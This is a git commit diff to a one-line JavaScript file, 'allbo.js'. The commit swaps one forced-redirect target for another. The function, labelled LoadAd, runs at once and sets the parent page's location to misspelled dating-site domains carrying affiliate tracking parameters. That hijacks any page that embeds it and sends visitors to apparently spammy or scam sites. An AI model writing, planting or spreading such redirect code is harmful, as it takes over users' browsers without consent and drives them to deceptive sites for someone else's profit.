93745b82053a40853f5a5fdb8b08900117aec4ff
style-font <121629902+style-font@users.noreply.github.com>
2025-07-22 20:50:02 +0700

    Update allbo.js

--- allbo.js
+++ allbo.js
@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="https://jdbqg.unfamllliardates.com/?utm_source=da57dc555e50572d&j1=1&s1=65949&s2=1231111&s3=en"; } LoadAd();
+function LoadAd() { parent.location.href="https://jdbqg.lloveonline.net/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=65949&s2=2153393&s3=ENMA2"; } LoadAd();
